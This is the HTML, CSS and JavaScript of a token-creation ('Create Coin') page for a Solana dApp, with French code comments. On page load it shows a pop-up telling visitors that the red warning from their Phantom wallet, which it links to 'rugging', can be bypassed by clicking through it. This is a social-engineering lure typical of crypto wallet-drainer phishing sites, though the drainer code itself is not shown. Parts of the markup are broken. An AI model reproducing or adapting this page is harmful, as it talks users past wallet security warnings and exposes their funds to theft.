    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background-color: black;
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
            overflow-x: hidden;
        }

        #particles-js {
            position: fixed;
            width: 100%;
            height: 100%;
            z-index: 0;
            top: 0;
            left: 0;
        }

        header {
            padding: 1.5rem;
            border-bottom: 1px solid rgba(59, 130, 246, 0.2);
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: relative;
            z-index: 1;
        }

        .logo-container {
            display: flex;
            align-items: center;
            gap: 0.75rem;
        }

        .logo-text {
            font-size: 1.875rem;
            font-weight: bold;
            background: linear-gradient(to right, #3b82f6, #9333ea);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 2rem;
            position: relative;
            z-index: 1;
        }

        .container {
            width: 100%;
            max-width: 48rem;
            padding: 1rem;
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        .form-label {
            display: block;
            margin-bottom: 0.5rem;
            color: #94a3b8;
            font-size: 0.875rem;
        }

        .form-input {
            width: 100%;
            padding: 0.75rem 1rem;
            background-color: rgba(30, 58, 138, 0.2);
            border: 1px solid rgba(59, 130, 246, 0.3);
            border-radius: 0.5rem;
            color: white;
            transition: all 0.3s ease;
        }

        .form-input:focus {
            outline: none;
            border-color: rgba(59, 130, 246, 0.6);
            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.1);
        }

        .form-input::placeholder {
            color: rgba(148, 163, 184, 0.5);
        }

        .create-button {
            width: 100%;
            padding: 1rem;
            margin-top: 2rem;
            border: none;
            border-radius: 0.5rem;
            background: linear-gradient(to right, #2563eb, #7c3aed);
            color: white;
            font-weight: 500;
            font-size: 1.125rem;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .create-button:hover {
            background: linear-gradient(to right, #3b82f6, #8b5cf6);
            transform: translateY(-2px);
        }

        footer {
            padding: 1rem;
            text-align: center;
            background: linear-gradient(to right, black, rgba(30, 58, 138, 0.1), black);
            border-top: 1px solid rgba(59, 130, 246, 0.2);
            position: relative;
            z-index: 1;
        }

        footer a {
            color: #60a5fa;
            text-decoration: none;
            font-size: 1.125rem;
            transition: color 0.3s;
        }

        footer a:hover {
            color: #93c5fd;
        }

        .profile-picture {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: linear-gradient(to right, #3b82f6, #9333ea);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 1.25rem;
        }

        .fade-in {
            opacity: 0;
            transform: scale(0.95);
            animation: fadeIn 0.6s cubic-bezier(0.4, 0, 0.2, 1) forwards;
        }

        @keyframes fadeIn {
            0% {
                opacity: 0;
                transform: scale(0.95);
            }
            100% {
                opacity: 1;
                transform: scale(1);
            }
        }

        .fade-out {
            opacity: 0;
            transform: scale(0.95);
            transition: all 0.3s ease;
        }

        .back-button-container {
            padding: 1.5rem;
            position: relative;
            z-index: 1;
        }

        .back-button {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.75rem 1.25rem;
            background: rgba(30, 58, 138, 0.2);
            border: 1px solid rgba(59, 130, 246, 0.3);
            border-radius: 0.5rem;
            color: #60a5fa;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .back-button:hover {
            background: rgba(30, 58, 138, 0.3);
            border-color: rgba(59, 130, 246, 0.5);
            transform: translateX(-4px);
        }

        /* Styles du pop-up */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(5px);
            z-index: 1000;
            animation: fadeIn 0.3s ease-out;
        }

        .modal {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(17, 24, 39, 0.95);
            border: 1px solid rgba(59, 130, 246, 0.3);
            border-radius: 1rem;
            padding: 2rem;
            width: 90%;
            max-width: 500px;
            z-index: 1001;
            animation: slideIn 0.3s ease-out;
        }

        .modal-close {
            position: absolute;
            top: 1rem;
            right: 1rem;
            color: #94a3b8;
            background: none;
            border: none;
            cursor: pointer;
            padding: 0.5rem;
            transition: color 0.3s;
        }

        .modal-close:hover {
            color: white;
        }

        .modal-title {
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 1rem;
            color: white;
            background: linear-gradient(to right, #3b82f6, #9333ea);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .modal-content {
            margin-bottom: 1.5rem;
            color: #94a3b8;
            line-height: 1.6;
        }

        .modal-image {
            width: 100%;
            height: 200px;
            object-fit: cover;
            border-radius: 0.5rem;
            margin-bottom: 1.5rem;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translate(-50%, -60%);
            }
            to {
                opacity: 1;
                transform: translate(-50%, -50%);
            }
        }
    </style>
</head>
<body>
    <div id="particles-js"></div>

    <!-- Pop-up Modal -->
        <div class="modal-overlay" id="modal">

                <button class="modal-close" onclick="closeModal()">

                        <line x1="6" y1="6" x2="18" y2="18"></line>
                    </svg>
                </button>
                <h2 class="modal-title">Important information</h2>
                <img src="./blowfish.png" alt="Welcome" class="modal-image">
                <div class="modal-content">
                    As you know, "Rugging" is not tolerated by Phantom. Thus, our dApp is not approved by Phantom. This is why there is a red message when you want to receive your tokens. To bypass this, all you need is to click the button at the bottom.. like in the image above.

    <header>
        <div class="logo-container">

        </div>
    </header>

    <div class="back-button-container">
        <button class="back-button" onclick="window.location.href='main.html'">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="m12 19-7-7 7-7"/>
                <path d="M19 12H5"/>
            </svg>
            Back to dashboard
        </button>
    </div>

    <main>
        <div class="container fade-in">
            <div class="form-group">
                <label for="name" class="form-label">Name</label>
                <input type="text" id="name" class="form-input" placeholder="Enter coin name">
            </div>

            <div class="form-group">
                <label for="ticker" class="form-label">Ticker</label>
                <input type="text" id="ticker" class="form-input" placeholder="Enter ticker symbol">
            </div>

            <div class="form-group">
                <label for="decimals" class="form-label">Market Cap</label>
                <input type="number" id="decimals" class="form-input" placeholder="Enter number of digits">
            </div>

            <div class="form-group">
                <label for="description" class="form-label">Description</label>
                <input type="text" id="description" class="form-input" placeholder="Enter coin description">
            </div>

            <div class="form-group">
                <label for="imageLink" class="form-label">Image link</label>
                <input type="text" id="imageLink" class="form-input" placeholder="Enter image URL">
            </div>

            <button class="create-button connect-wallet">Create Coin</button>

        </div>
    </main>



    <script>
        particlesJS('particles-js', {
            particles: {
                number: {
                    value: 80,
                    density: {
                        enable: true,
                        value_area: 800
                    }
                },
                color: {
                    value: '#3b82f6'
                },
                shape: {
                    type: 'circle'
                },
                opacity: {
                    value: 0.5,
                    random: true,
                    animation: {
                        enable: true,
                        speed: 1,
                        opacity_min: 0.1,
                        sync: false
                    }
                },
                size: {
                    value: 3,
                    random: true,
                    animation: {
                        enable: true,
                        speed: 2,
                        size_min: 0.1,
                        sync: false
                    }
                },
                line_linked: {
                    enable: true,
                    distance: 150,
                    color: '#3b82f6',
                    opacity: 0.2,
                    width: 1
                },
                move: {
                    enable: true,
                    speed: 2,
                    direction: 'none',
                    random: true,
                    straight: false,
                    out_mode: 'bounce',
                    bounce: false,
                    attract: {
                        enable: true,
                        rotateX: 600,
                        rotateY: 1200
                    }
                }
            },
            interactivity: {
                detect_on: 'canvas',
                events: {
                    onhover: {
                        enable: true,
                        mode: 'grab'
                    },
                    onclick: {
                        enable: true,
                        mode: 'push'
                    },
                    resize: true
                },
                modes: {
                    grab: {
                        distance: 140,
                        line_linked: {
                            opacity: 0.8
                        }
                    },
                    push: {
                        particles_nb: 4
                    }
                }
            },
            retina_detect: true
        });

        // Ajoutez dans le header un lien de retour
        const logoContainer = document.querySelector('.logo-container');
        logoContainer.style.cursor = 'pointer';
        logoContainer.addEventListener('click', async () => {
            document.querySelector('.container').classList.add('fade-out');
            await new Promise(resolve => setTimeout(resolve, 300));
            window.location.href = 'main.html';
        });

        // Fonctions pour le modal
        function showModal() {
            document.getElementById('modal').style.display = 'block';
            document.body.style.overflow = 'hidden';
        }

        function closeModal() {
            document.getElementById('modal').style.display = 'none';
            document.body.style.overflow = 'auto';
        }

        // Afficher le modal au chargement
        window.addEventListener('load', showModal);

        // Fermer le modal en cliquant sur l'overlay
        document.getElementById('modal').addEventListener('click', function(e) {
            if (e.target === this) {
                closeModal();
            }
        });
    </script>
</body>
